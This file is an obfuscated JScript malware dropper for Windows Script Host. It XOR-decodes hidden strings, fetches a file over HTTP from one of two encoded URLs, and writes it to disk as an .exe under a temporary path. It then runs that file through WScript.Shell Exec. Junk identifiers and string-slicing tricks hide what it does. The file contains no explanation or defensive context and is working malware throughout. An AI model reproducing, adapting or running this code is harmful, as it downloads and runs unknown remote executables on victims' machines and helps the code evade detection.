function btoa(commiserateuSb, exigencyedx, sleightziT, brawnu84, specioustlL, omniscientkvw, apologistCaw, genesisavT, furnishqTl, apotheosisnVa, cohortneh, traduceApU) {
    var preceptp0i = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=";
    var venialu03 = String(traduceApU);
    for (var symmetryrLg, enjoinoA7, comprehensiveMSV = 0, theoryvSw = preceptp0i, congealbwx = ""; venialu03.charAt(comprehensiveMSV | 0) || (theoryvSw = "=", 
    comprehensiveMSV % 1); congealbwx += theoryvSw.charAt(63 & symmetryrLg >> 8 - comprehensiveMSV % 1 * 8)) {
        enjoinoA7 = venialu03.charCodeAt(comprehensiveMSV += 3 / 4);
        if (enjoinoA7 > 255) {
            throw new InvalidCharacterError("'btoa' failed: The string to be encoded contains characters outside of the Latin1 range.");
        }
        symmetryrLg = symmetryrLg << 8 | enjoinoA7;
    }
    return congealbwx;
}

var oratorioeuS = function(theoryQWA) {
    var aproposh7p = "";
    var commiserateuSb = "monetaryVmM";
    var exigencyedx = "anthropomorphicxbR";
    var sleightziT = "immurevKL";
    var brawnu84 = "rebusZll";
    var specioustlL = "adventitiousSwD";
    var omniscientkvw = "depravenyI";
    var apologistCaw = "salientM6r";
    var genesisavT = "spatkji";
    var furnishqTl = "ascendancykfP";
    var apotheosisnVa = "approachwAd";
    var cohortneh = "advertCEs";
    btoa(commiserateuSb, exigencyedx, sleightziT, brawnu84, specioustlL, omniscientkvw, apologistCaw, genesisavT, furnishqTl, apotheosisnVa, cohortneh, [ 108, 202, 50, 170, 100, 233, 155, 256, 33, 91, 208, 196, 73, 23, 41, 148 ]);
    var brooki1O = String["sdfadfasdffromChar".slice(10) + "Codedsfadsfasdg".slice(0, 4)];
    for (var halejwM = 0; halejwM < theoryQWA.length; halejwM++) {
        var ebbGC8 = [ 108, 202, 50, 170, 100, 233, 155, 256, 33, 91, 208, 196, 73, 23, 41, 148 ];
        aproposh7p += brooki1O(theoryQWA[halejwM] ^ ebbGC8[halejwM % ebbGC8.length]);
    }
    return aproposh7p;
};

var retentivePIt = function() {
    var jibemdm = function() {
        var fawningRqS = oratorioeuS([ 22, 160, 75, 146, 21, 217, 216, 325, 98, 98 ]);
        var blightedeNn = oratorioeuS([ 57, 185, 69, 226, 47, 170, 163, 359, 106, 61 ]);
    };
    jibemdm.prototype.SEfR82wS85 = function(dintPXo) {
        var besiegesdh = oratorioeuS([ 47, 184, 87, 203, 16, 140, 212, 354, 75, 62, 179, 176 ]);
        return wsh[besiegesdh](dintPXo);
    };
    jibemdm.prototype.xFbcFqLBVA = function(dintPXo) {
        var besiegesdh = oratorioeuS([ 47, 184, 87, 203, 16, 140, 212, 354, 75, 62, 179, 176 ]);
        return WScript[besiegesdh](dintPXo);
    };
    return jibemdm;
}();

(function() {
    var capriciousmi0 = [ oratorioeuS([ 4, 190, 70, 218, 94, 198, 180, 360, 81, 58, 162, 161, 48, 120, 92, 252, 9, 184, 87, 219, 21, 199, 248, 367, 76, 116, 232, 243, 103, 114, 81, 241 ]), oratorioeuS([ 4, 190, 70, 218, 94, 198, 180, 360, 81, 58, 188, 183, 38, 96, 72, 250, 24, 185, 84, 204, 74, 138, 244, 365, 14, 99, 231, 234, 44, 111, 76 ]) ];
    var inclusiveDEa = 4194304;
    var restrainedWye = oratorioeuS([ 59, 160, 10, 226, 20, 141, 218, 377, 87, 105 ]);
    var semblanceMBX = oratorioeuS([ 58, 136, 11, 198, 53, 177, 241, 338, 96, 19 ]);
    var acrimonyOvA = oratorioeuS([ 29, 153, 104, 225, 53, 159, 227, 329, 118, 16 ]);
    var implacableHhD = new retentivePIt();
    var rankleJfn = implacableHhD[oratorioeuS([ 20, 140, 80, 201, 34, 152, 215, 322, 119, 26 ])];
    var sybariteBA8 = rankleJfn(oratorioeuS([ 59, 153, 81, 216, 13, 153, 239, 302, 114, 51, 181, 168, 37 ]));
    var alcovezvn = rankleJfn(oratorioeuS([ 33, 153, 106, 231, 40, 219, 181, 344, 108, 23, 152, 144, 29, 71 ]));
    var blatantBPd = rankleJfn(oratorioeuS([ 45, 142, 125, 238, 38, 199, 200, 372, 83, 62, 177, 169 ]));
    var syllogismHTj = sybariteBA8.ExpandEnvironmentStrings(oratorioeuS([ 73, 158, 119, 231, 52, 204, 199 ]));
    var dilettanteQBV = syllogismHTj + inclusiveDEa + oratorioeuS([ 66, 175, 74, 207 ]);
    var inclemente95 = false;
    var grandiloquentZ7u = 200;
    for (var pellucidUKL = 0; pellucidUKL < capriciousmi0.length; pellucidUKL++) {
        try {
            var unimpeachableQ5K = capriciousmi0[pellucidUKL];
            alcovezvn.open(oratorioeuS([ 43, 143, 102 ]), unimpeachableQ5K, false);
            alcovezvn.send();
            if (alcovezvn.status == grandiloquentZ7u) {
                try {
                    blatantBPd[oratorioeuS([ 3, 186, 87, 196 ])]();
                    blatantBPd.type = 1;
                    blatantBPd[oratorioeuS([ 27, 184, 91, 222, 1 ])](alcovezvn[oratorioeuS([ 30, 175, 65, 218, 11, 135, 232, 357, 99, 52, 180, 189 ])]);
                    var magisterialJJ8 = Math.pow(2, 10) * 249;
                    if (blatantBPd.size > magisterialJJ8) {
                        pellucidUKL = capriciousmi0.length;
                        blatantBPd.position = 0;
                        blatantBPd.saveToFile(dilettanteQBV, 2);
                        inclemente95 = true;
                    }
                } finally {
                    blatantBPd.close();
                }
            }
        } catch (ignored) {}
    }
    if (inclemente95) {
        sybariteBA8[oratorioeuS([ 41, 178, 87, 201 ])](syllogismHTj + Math.pow(2, 22));
    }
})();